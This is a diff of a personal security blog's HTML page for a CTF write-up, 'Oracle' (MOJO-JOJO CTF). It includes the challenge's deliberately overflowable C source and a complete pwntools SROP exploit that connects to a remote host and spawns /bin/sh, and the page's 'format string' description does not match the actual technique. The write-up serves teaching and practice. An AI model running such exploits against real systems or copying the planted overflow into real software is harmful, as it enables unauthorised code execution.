@@ -1,301 +1,64 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Oracle // r3t0x</title>
-    <link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml">
-    <meta name="description" content="The Oracle knows all — but can you make it speak? Exploit a format string vulnerability to leak secrets from memory and gain arbitrary read/write to p">
-    <link rel="stylesheet" href="../../../../static/css/style.css?v=43fea522e0ce">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#0c0c0e">
+<title>Oracle — MOJO-JOJO CTF — r3t0x</title>
+<meta name="description" content="The Oracle knows all — but can you make it speak? Exploit a format string vulnerability to leak secrets from memory and gain arbitrary read/write to p…">
+<meta name="author" content="Ghaith Amdouni">
+<link rel="canonical" href="https://r3t0x.me/challenge/mojo-jojo/pwn/oracle/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Oracle — MOJO-JOJO CTF — r3t0x">
+<meta property="og:description" content="The Oracle knows all — but can you make it speak? Exploit a format string vulnerability to leak secrets from memory and gain arbitrary read/write to p…">
+<meta property="og:url" content="https://r3t0x.me/challenge/mojo-jojo/pwn/oracle/">
+<meta property="og:image" content="https://r3t0x.me/static/img/social-card.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml">
+<link rel="alternate" type="application/rss+xml" title="r3t0x — writeups" href="/feed.xml">
+<link rel="stylesheet" href="/static/css/main.css?v=f322459a0a">
+<script src="/static/js/main.js?v=f322459a0a" defer></script>
 </head>
 <body>
-    <!-- Genjutsu Transition Overlay -->
-    <div class="genjutsu-overlay initial-closed" id="genjutsuOverlay">
-        <div class="eyelid eyelid-top"></div>
-        <div class="eyelid eyelid-bottom"></div>
-        <div class="genjutsu-eye">
-                <svg viewBox="0 0 200 200">
-                    <circle cx="100" cy="100" r="94" fill="var(--blood-red)" stroke="#000" stroke-width="10"/>
-                    <!-- Base 3-Tomoe -->
-                    <g class="base-sharingan" style="transform-origin: 100px 100px;">
-                        <circle cx="100" cy="100" r="90" fill="var(--blood-red)"/>
-                        <circle cx="100" cy="100" r="16" fill="#000"/>
-                        <circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/>
-                        <g class="tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
-                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(120deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
-                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(240deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
-                    </g>
-                    <!-- Uploaded Image Mangekyo -->
-                    <defs>
-                        <clipPath id="circleClip">
-                            <circle cx="100" cy="100" r="98" />
-                        </clipPath>
-                    </defs>
-                    <image href="../../../../static/img/mangekyou.png" x="0" y="0" height="200" width="200" class="mangekyo" style="transform-origin: 100px 100px; opacity: 0; clip-path: url(#circleClip);" />
-                </svg>
-        </div>
-    </div>
-    <div class="scanlines"></div>
-    <div class="scroll-indicator" id="scrollIndicator"></div>
-    <div class="scroll-addr" id="scrollAddr">0x00000000</div>
-    <div class="pwndbg-bg" id="pwndbgBg"></div>
-
-    <div class="container" style="gap: 40px;">
-
-        <a href="../../../../index.html" class="back-link">← pwndbg> back</a>
-
-        <div class="chall-header">
-            <h1><span class="prefix">./</span>Oracle<span class="cursor-blink">_</span></h1>
-            <div class="chall-meta-row">
-                <span class="tag">PWN</span>
-                <span>MOJO-JOJO CTF</span>
-                <span>0xa189c633</span>
-                <span>by r3t0x</span>
-                
-                <span>
-                    <span class="difficulty">
-                        
-                        <span class="diff-dot filled"></span>
-                        
-                        <span class="diff-dot filled"></span>
-                        
-                        <span class="diff-dot filled"></span>
-                        
-                        <span class="diff-dot "></span>
-                        
-                        <span class="diff-dot "></span>
-                        
-                    </span>
-                </span>
-            </div>
-        </div>
-
-        <!-- Description -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">DESCRIPTION</div>
-            <div class="code-block">
-                The Oracle knows all — but can you make it speak? Exploit a format string vulnerability to leak secrets from memory and gain arbitrary read/write to pop a shell.
-            </div>
-        </div>
-
-
-
-        
-        <!-- Source Code / Disasm -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">DISASM // SOURCE</div>
-            
-            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// main.c</div>
-            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
-                <pre style="margin: 0; padding: 0; background: none; border: none;">const char binsh[] = &#34;/bin/sh&#34;;
-
-// Force the compiler to actually use it
-void* get_binsh() {
-    return (void*)binsh;
-}
-
-// Syscall wrappers
-long syscall_write(int fd, const void *buf, unsigned long count) {
-    long ret;
-    __asm__ volatile (
-        &#34;mov $1, %%rax\n&#34;
-        &#34;syscall&#34;
-        : &#34;=a&#34;(ret)
-        : &#34;D&#34;(fd), &#34;S&#34;(buf), &#34;d&#34;(count)
-        : &#34;rcx&#34;, &#34;r11&#34;, &#34;memory&#34;
-    );
-    return ret;
-}
-
-long syscall_read(int fd, void *buf, unsigned long count) {
-    long ret;
-    __asm__ volatile (
-        &#34;mov $0, %%rax\n&#34;
-        &#34;syscall&#34;
-        : &#34;=a&#34;(ret)
-        : &#34;D&#34;(fd), &#34;S&#34;(buf), &#34;d&#34;(count)
-        : &#34;rcx&#34;, &#34;r11&#34;, &#34;memory&#34;
-    );
-    return ret;
-}
-
-void syscall_exit(int code) {
-    __asm__ volatile (
-        &#34;mov $60, %%rax\n&#34;
-        &#34;syscall&#34;
-        :
-        : &#34;D&#34;(code)
-    );
-}
-
-// Helper to print strings
-void print(const char *s) {
-    int len = 0;
-    while(s[len]) len++;
-    syscall_write(1, s, len);
-}
-
-// Our two gadgets
-void echo_rax() {
-    __asm__(&#34;pop %rax; ret;&#34;);
-}
-
-void echo_call() {
-    __asm__(&#34;syscall; ret;&#34;);
-}
-
-// Vulnerable function
-void listen() {
-    char whisper[16];
-    print(&#34;The void echoes...\n&#34;);
-    syscall_read(0, whisper, 512);
-}
-
-// Entry point (no main, no libc)
-void _start() {
-    print(&#34;════════════════════════════════\n&#34;);
-    print(&#34;          ECHOES \n&#34;);
-    print(&#34;════════════════════════════════\n&#34;);
-    print(&#34;In the silence, two sounds remain\n&#34;);
-    print(&#34;Can you make them resonate?\n&#34;);
-    print(&#34;════════════════════════════════\n\n&#34;);
-    
-    listen();
-    
-    print(&#34;\n  Silence returns...\n&#34;);
-    syscall_exit(0);
-}</pre>
-            </div>
-            
-            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// sol.py</div>
-            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
-                <pre style="margin: 0; padding: 0; background: none; border: none;">from pwn import *
-
-context.log_level = &#39;info&#39;
-context.arch = &#39;amd64&#39;
-binary = &#39;./main&#39;
-elf = ELF(binary)
-p = remote(&#39;4.233.210.175&#39;,9003)
-
-
-echo_rax = 0x4010ce   # pop rax ; ret
-echo_call = 0x4010d7  # syscall ; ret
-
-log.success(f&#34; Echo 1 (pop rax): {hex(echo_rax)}&#34;)
-log.success(f&#34; Echo 2 (syscall): {hex(echo_call)}&#34;)
-
-# ═══════════════════════════════════════
-# Find /bin/sh string in binary
-# ═══════════════════════════════════════
-try:
-    binsh = next(elf.search(b&#39;/bin/sh\x00&#39;))
-except StopIteration:
-    try:
-        binsh = next(elf.search(b&#39;/bin/sh&#39;))
-    except StopIteration:
-        # From your objdump: /bin/sh is at 0x402000
-        binsh = 0x402000
-        log.warning(f&#34;Hardcoded /bin/sh address: {hex(binsh)}&#34;)
-
-log.success(f&#34;/bin/sh found at: {hex(binsh)}&#34;)
-
-p.recvuntil(b&#39;echoes...&#39;)
-
-log.info(&#34;Building SIGROP payload...&#34;)
-
-offset = 24  # 16 bytes buffer + 8 bytes RBP
-
-payload = b&#39;A&#39; * offset
-
-# Set rax = 15 (sys_rt_sigreturn)
-payload += p64(echo_rax)
-payload += p64(15)
-
-# Call sigreturn
-payload += p64(echo_call)
-
-# Build sigreturn frame for execve
-frame = SigreturnFrame()
-frame.rax = 59           # sys_execve
-frame.rdi = binsh        # pointer to &#34;/bin/sh&#34; 
-frame.rsi = 0            # argv = NULL
-frame.rdx = 0            # envp = NULL
-frame.rip = echo_call    # return to syscall gadget
-frame.rsp = 0# safe stack location
-
-payload += bytes(frame)
-
-# ═══════════════════════════════════════
-# Send exploit
-# ═══════════════════════════════════════
-log.info(f&#34;Payload size: {len(payload)} bytes&#34;)
-log.info(&#34;Sending the resonance...&#34;)
-
-p.send(payload)
-sleep(0.5)
-log.success(&#34;=&#34; * 50)
-log.success(&#34; The echoes sing together!&#34;)
-log.success(&#34;Shell spawned!&#34;)
-log.success(&#34;=&#34; * 50)
-
-p.interactive()
-</pre>
-            </div>
-            
-        </div>
-        
-
-        
-        <!-- Writeup -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">WRITEUP // WALKTHROUGH</div>
-            <div class="writeup-content">
-                <h1>Oracle (Echoes) — Writeup</h1>
-<h2>Challenge Overview</h2>
-<table>
-<thead>
-<tr>
-<th>Field</th>
-<th>Value</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>Category</strong></td>
-<td>PWN</td>
-</tr>
-<tr>
-<td><strong>Difficulty</strong></td>
-<td>Hard</td>
-</tr>
-<tr>
-<td><strong>Author</strong></td>
-<td>r3t0x</td>
-</tr>
-<tr>
-<td><strong>Technique</strong></td>
-<td>SROP (Sigreturn-Oriented Programming)</td>
-</tr>
-</tbody>
-</table>
-<h2>Reconnaissance</h2>
-<div class="codehilite"><pre><span></span><code>pwndbg&gt;<span class="w"> </span>checksec<span class="w"> </span>./main
-<span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
-<span class="w">    </span>RELRO:<span class="w">    </span>No<span class="w"> </span>RELRO
-<span class="w">    </span>Stack:<span class="w">    </span>No<span class="w"> </span>canary<span class="w"> </span>found
-<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled
-<span class="w">    </span>PIE:<span class="w">      </span>No<span class="w"> </span>PIE
-</code></pre></div>
+<a class="skip" href="#main">Skip to content</a>
+<header class="masthead">
+  <div class="shell">
+    <a class="brand" href="/"><img class="mark" src="/static/img/mangekyou.png" alt="" width="20" height="20" loading="lazy" decoding="async"><span>r3t0x</span></a>
+    <nav aria-label="Main"><a href="/">home</a><a href="/blog/" aria-current="page">writeups</a><a href="/projects/">projects</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>cv</a></nav>
+    <button type="button" class="search-open" data-open-search aria-label="Search the site">search<kbd>/</kbd></button>
+  </div>
+</header>
+<main id="main"><div class="shell narrow"><article class="writeup">
+  <header class="page-head">
+    <p class="kicker"><a href="/blog/#mojo-jojo-ctf">MOJO-JOJO CTF</a> / pwn</p>
+    <h1>Oracle</h1>
+    <p class="lede">The Oracle knows all — but can you make it speak? Exploit a format string vulnerability to leak secrets from memory and gain arbitrary read/write to p…</p>
+    <dl class="facts">
+      <div><dt>difficulty</dt><dd>medium</dd></div>
+      <div><dt>points</dt><dd>—</dd></div>
+      <div><dt>published</dt><dd><time datetime="2026-09-28">28 Sept 2026</time></dd></div>
+      <div><dt>author</dt><dd>r3t0x</dd></div>
+    </dl>
+    <p class="tags"><span>SROP (Sigreturn-Oriented Programming)</span></p>
+  </header>
+  <nav class="toc" aria-label="On this page"><p>contents</p><ol><li><a href="#reconnaissance">Reconnaissance</a></li><li><a href="#the-two-gadgets">The Two Gadgets</a></li><li><a href="#exploit-strategy-srop">Exploit Strategy: SROP</a></li><li><a href="#result">Result</a></li><li><a href="#solver">Reference solver</a></li><li><a href="#flag">Flag</a></li></ol></nav>
+  <div class="prose">
+    <h2 id="reconnaissance">Reconnaissance</h2>
+<figure class="code"><figcaption><span>console</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>pwndbg&gt; checksec ./main
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE</code></pre></figure>
 
 <p>This is a <strong>statically linked, no-libc</strong> binary. It uses raw syscalls only — <code>read</code>, <code>write</code>, and <code>exit</code>. This means there's no <code>system()</code>, no <code>printf()</code>, nothing from libc. We must use raw syscalls.</p>
-<h2>The Two Gadgets</h2>
+<h2 id="the-two-gadgets">The Two Gadgets</h2>
 <p>The binary provides exactly <strong>two gadgets</strong>:</p>
-<div class="codehilite"><pre><span></span><code><span class="nl">echo_rax:</span><span class="w">  </span><span class="nf">pop</span><span class="w"> </span><span class="nb">rax</span><span class="w"> </span><span class="c1">; ret     @ 0x4010ce</span>
-<span class="nl">echo_call:</span><span class="w"> </span><span class="nf">syscall</span><span class="w"> </span><span class="c1">; ret     @ 0x4010d7</span>
-</code></pre></div>
+<figure class="code"><figcaption><span>output</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>echo_rax:  pop rax ; ret     @ 0x4010ce
+echo_call: syscall ; ret     @ 0x4010d7</code></pre></figure>
 
 <p>With <code>pop rax; ret</code> + <code>syscall; ret</code>, we can invoke <strong>any syscall</strong> by controlling RAX.</p>
-<h2>Exploit Strategy: SROP</h2>
+<h2 id="exploit-strategy-srop">Exploit Strategy: SROP</h2>
 <p><strong>Sigreturn-Oriented Programming</strong> abuses <code>sys_rt_sigreturn</code> (syscall 15) to restore a fake signal frame, giving us full control over all registers.</p>
 <ol>
 <li><strong>Overflow buffer</strong> (16 bytes + 8 bytes RBP = offset 24)</li>
@@ -307,111 +70,113 @@ p.interactive()
 <li><code>RSI = 0, RDX = 0</code></li>
 <li><code>RIP = syscall; ret</code></li>
 </ol>
-<div class="codehilite"><pre><span></span><code><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
-<span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">59</span>           <span class="c1"># sys_execve</span>
-<span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">binsh</span>        <span class="c1"># &quot;/bin/sh&quot; in .rodata</span>
-<span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
-<span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
-<span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">echo_call</span>    <span class="c1"># syscall; ret</span>
-</code></pre></div>
-
-<h2>Result</h2>
-<div class="codehilite"><pre><span></span><code><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="w"> </span><span class="n">found</span><span class="w"> </span><span class="n">at</span><span class="p">:</span><span class="w"> </span><span class="mh">0x402000</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Building</span><span class="w"> </span><span class="n">SIGROP</span><span class="w"> </span><span class="n">payload</span><span class="o">...</span>
-<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">echoes</span><span class="w"> </span><span class="n">sing</span><span class="w"> </span><span class="n">together</span><span class="o">!</span>
-<span class="o">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
-<span class="n">MOJO</span><span class="o">-</span><span class="n">JOJO</span><span class="p">{</span><span class="n">s1gr3turn_m4st3r</span><span class="p">}</span>
-</code></pre></div>
-            </div>
-        </div>
-        
-
-        
-        <!-- Exploit / Solver -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">EXECUTION // EXPLOIT</div>
-            <div style="color: var(--text-muted); margin-bottom: 10px; font-size: 0.85rem;">
-                <span style="color: var(--gdb-green);">$</span> python3 solve.py
-            </div>
-            <div class="code-block" style="max-height: 600px; overflow-y: auto;">
-                <pre style="margin: 0; padding: 0; background: none; border: none;">from pwn import *
-
-context.log_level = &#39;info&#39;
-context.arch = &#39;amd64&#39;
-binary = &#39;./main&#39;
-elf = ELF(binary)
-p = remote(&#39;4.233.210.175&#39;,9003)
-
-
-echo_rax = 0x4010ce   # pop rax ; ret
-echo_call = 0x4010d7  # syscall ; ret
-
-log.success(f&#34; Echo 1 (pop rax): {hex(echo_rax)}&#34;)
-log.success(f&#34; Echo 2 (syscall): {hex(echo_call)}&#34;)
-
-# ═══════════════════════════════════════
-# Find /bin/sh string in binary
-# ═══════════════════════════════════════
-try:
-    binsh = next(elf.search(b&#39;/bin/sh\x00&#39;))
-except StopIteration:
-    try:
-        binsh = next(elf.search(b&#39;/bin/sh&#39;))
-    except StopIteration:
-        # From your objdump: /bin/sh is at 0x402000
-        binsh = 0x402000
-        log.warning(f&#34;Hardcoded /bin/sh address: {hex(binsh)}&#34;)
-
-log.success(f&#34;/bin/sh found at: {hex(binsh)}&#34;)
-
-p.recvuntil(b&#39;echoes...&#39;)
-
-log.info(&#34;Building SIGROP payload...&#34;)
-
-offset = 24  # 16 bytes buffer + 8 bytes RBP
-
-payload = b&#39;A&#39; * offset
-
-# Set rax = 15 (sys_rt_sigreturn)
-payload += p64(echo_rax)
-payload += p64(15)
-
-# Call sigreturn
-payload += p64(echo_call)
-
-# Build sigreturn frame for execve
-frame = SigreturnFrame()
+<figure class="code"><figcaption><span>output</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>frame = SigreturnFrame()
 frame.rax = 59           # sys_execve
-frame.rdi = binsh        # pointer to &#34;/bin/sh&#34; 
-frame.rsi = 0            # argv = NULL
-frame.rdx = 0            # envp = NULL
-frame.rip = echo_call    # return to syscall gadget
-frame.rsp = 0# safe stack location
+frame.rdi = binsh        # &quot;/bin/sh&quot; in .rodata
+frame.rsi = 0
+frame.rdx = 0
+frame.rip = echo_call    # syscall; ret</code></pre></figure>
 
-payload += bytes(frame)
+<h2 id="result">Result</h2>
+<figure class="code"><figcaption><span>console</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>[+] /bin/sh found at: 0x402000
+[*] Building SIGROP payload...
+[+] The echoes sing together!
+$ cat flag.txt
+MOJO-JOJO{s1gr3turn_m4st3r}</code></pre></figure>
+    <h2 id="solver">Reference solver</h2>
+    <figure class="code"><figcaption><span>solve.py</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code class="language-python"><span class="t-k">from</span> pwn <span class="t-k">import</span> *
 
-# ═══════════════════════════════════════
-# Send exploit
-# ═══════════════════════════════════════
-log.info(f&#34;Payload size: {len(payload)} bytes&#34;)
-log.info(&#34;Sending the resonance...&#34;)
+context.log_level = <span class="t-s">'info'</span>
+context.arch = <span class="t-s">'amd64'</span>
+binary = <span class="t-s">'./main'</span>
+elf = <span class="t-f">ELF</span>(binary)
+p = <span class="t-f">remote</span>(<span class="t-s">'4.233.210.175'</span>,<span class="t-m">9003</span>)
 
-p.send(payload)
-sleep(0.5)
-log.success(&#34;=&#34; * 50)
-log.success(&#34; The echoes sing together!&#34;)
-log.success(&#34;Shell spawned!&#34;)
-log.success(&#34;=&#34; * 50)
 
-p.interactive()
-</pre>
-            </div>
-        </div>
-        
+echo_rax = <span class="t-m">0x4010ce</span>   <span class="t-c"># pop rax ; ret</span>
+echo_call = <span class="t-m">0x4010d7</span>  <span class="t-c"># syscall ; ret</span>
 
-        <div style="height: 80px;"></div>
-    </div>
+log.<span class="t-f">success</span>(f<span class="t-s">&quot; Echo 1 (pop rax): {hex(echo_rax)}&quot;</span>)
+log.<span class="t-f">success</span>(f<span class="t-s">&quot; Echo 2 (syscall): {hex(echo_call)}&quot;</span>)
 
-    <script src="../../../../static/js/main.js?v=43fea522e0ce"></script>
+<span class="t-c"># ═══════════════════════════════════════</span>
+<span class="t-c"># Find /bin/sh string in binary</span>
+<span class="t-c"># ═══════════════════════════════════════</span>
+<span class="t-k">try</span>:
+    binsh = <span class="t-f">next</span>(elf.<span class="t-f">search</span>(b<span class="t-s">'/bin/sh\x00'</span>))
+<span class="t-k">except</span> StopIteration:
+    <span class="t-k">try</span>:
+        binsh = <span class="t-f">next</span>(elf.<span class="t-f">search</span>(b<span class="t-s">'/bin/sh'</span>))
+    <span class="t-k">except</span> StopIteration:
+        <span class="t-c"># From your objdump: /bin/sh is at 0x402000</span>
+        binsh = <span class="t-m">0x402000</span>
+        log.<span class="t-f">warning</span>(f<span class="t-s">&quot;Hardcoded /bin/sh address: {hex(binsh)}&quot;</span>)
+
+log.<span class="t-f">success</span>(f<span class="t-s">&quot;/bin/sh found at: {hex(binsh)}&quot;</span>)
+
+p.<span class="t-f">recvuntil</span>(b<span class="t-s">'echoes...'</span>)
+
+log.<span class="t-f">info</span>(<span class="t-s">&quot;Building SIGROP payload...&quot;</span>)
+
+offset = <span class="t-m">24</span>  <span class="t-c"># 16 bytes buffer + 8 bytes RBP</span>
+
+payload = b<span class="t-s">'A'</span> * offset
+
+<span class="t-c"># Set rax = 15 (sys_rt_sigreturn)</span>
+payload += <span class="t-f">p64</span>(echo_rax)
+payload += <span class="t-f">p64</span>(<span class="t-m">15</span>)
+
+<span class="t-c"># Call sigreturn</span>
+payload += <span class="t-f">p64</span>(echo_call)
+
+<span class="t-c"># Build sigreturn frame for execve</span>
+frame = <span class="t-f">SigreturnFrame</span>()
+frame.rax = <span class="t-m">59</span>           <span class="t-c"># sys_execve</span>
+frame.rdi = binsh        <span class="t-c"># pointer to &quot;/bin/sh&quot; </span>
+frame.rsi = <span class="t-m">0</span>            <span class="t-c"># argv = NULL</span>
+frame.rdx = <span class="t-m">0</span>            <span class="t-c"># envp = NULL</span>
+frame.rip = echo_call    <span class="t-c"># return to syscall gadget</span>
+frame.rsp = <span class="t-m">0</span><span class="t-c"># safe stack location</span>
+
+payload += <span class="t-f">bytes</span>(frame)
+
+<span class="t-c"># ═══════════════════════════════════════</span>
+<span class="t-c"># Send exploit</span>
+<span class="t-c"># ═══════════════════════════════════════</span>
+log.<span class="t-f">info</span>(f<span class="t-s">&quot;Payload size: {len(payload)} bytes&quot;</span>)
+log.<span class="t-f">info</span>(<span class="t-s">&quot;Sending the resonance...&quot;</span>)
+
+p.<span class="t-f">send</span>(payload)
+<span class="t-f">sleep</span>(<span class="t-m">0.5</span>)
+log.<span class="t-f">success</span>(<span class="t-s">&quot;=&quot;</span> * <span class="t-m">50</span>)
+log.<span class="t-f">success</span>(<span class="t-s">&quot; The echoes sing together!&quot;</span>)
+log.<span class="t-f">success</span>(<span class="t-s">&quot;Shell spawned!&quot;</span>)
+log.<span class="t-f">success</span>(<span class="t-s">&quot;=&quot;</span> * <span class="t-m">50</span>)
+
+p.<span class="t-f">interactive</span>()</code></pre></figure>
+    <h2 id="flag">Flag</h2>
+    <p class="flag"><code>MOJO-JOJO{s1gr3turn_m4st3r}</code><button type="button" class="copy" data-copy>copy</button></p>
+  </div>
+  <nav class="pager" aria-label="More writeups">
+    <a href="/challenge/mojo-jojo/pwn/HIP-HOP/"><span>previous</span><strong>HIP-HOP</strong></a>
+    <a class="next" href="/challenge/mojo-jojo/pwn/oracle_Revenge/"><span>next</span><strong>Two Echoes - Revenge</strong></a>
+  </nav>
+</article></div></main>
+<footer class="colophon">
+  <div class="shell">
+    <p><strong>Ghaith Amdouni</strong> · Binary exploitation &amp; systems · Tunis, Tunisia</p>
+    <nav aria-label="Elsewhere"><a href="https://github.com/Ghaith-amdouni">GitHub</a><a href="https://www.linkedin.com/in/amdouni-ghaith">LinkedIn</a><a href="https://www.credly.com/users/ghaith-amdouni">Credly</a><a href="/feed.xml">RSS</a><a href="mailto:ghaith.amdouni@insat.ucar.tn">email</a></nav>
+    <p class="fine">© 2026 Ghaith Amdouni · <a href="https://github.com/Ghaith-amdouni/ghaith-amdouni.github.io">site source</a><img class="hits" src="https://hits.sh/r3t0x.me.svg?view=total&style=flat-square&label=visits&color=161619&labelColor=0c0c0e" alt="" width="88" height="20" loading="lazy"></p>
+  </div>
+</footer>
+<dialog id="search" aria-label="Search">
+  <form method="dialog" class="search-head">
+    <label for="search-input"><span aria-hidden="true">&gt;</span><span class="sr-only">Search writeups, projects and pages</span></label>
+    <input id="search-input" type="search" placeholder="search writeups, projects, pages" autocomplete="off" spellcheck="false">
+    <button value="close" aria-label="Close search">esc</button>
+  </form>
+  <ul id="search-results"></ul>
+  <p class="search-foot"><span id="search-count">start typing</span><span>&uarr;&darr; move · enter open</span></p>
+</dialog>
 </body>
 </html>
